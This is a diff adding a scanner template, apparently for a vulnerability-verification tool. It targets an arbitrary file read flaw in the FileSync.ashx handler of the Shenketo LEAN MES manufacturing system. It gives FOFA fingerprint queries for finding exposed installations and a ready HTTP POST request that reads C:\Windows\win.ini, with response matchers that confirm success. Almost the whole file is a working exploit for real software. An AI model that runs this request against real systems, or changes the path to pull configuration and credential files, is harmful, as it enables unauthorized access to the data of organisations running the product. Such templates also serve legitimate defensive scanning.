@@ -1,0 +1,26 @@
+## id: VEID-2026-11121
+## name: 深科特LEAN MES系统 FileSync.ashx 存在任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2026
+## description: 深科特LEAN MES系统 FileSync.ashx 存在任意文件读取漏洞，攻击者可进行文件读取，获取重要敏感配置信息。
+## affects: 深科特LEAN MES系统
+## fofa-query: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+## verification: true
+
+
+
+POST /Handler/FileSync.ashx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+type=DownLoad&sourceFileUrl=C:\\Windows\\win.ini
+
+#@ condition: and
+#@ matcher: body contains "[fonts]" && body contains "[extensions]"
+#@ matcher: status_code == 200
+
+
+# @VEIL-STAMP: 881336602c4a6e04bac55506698975f103acc4cb9ce1bfdb989c63513c792f9f
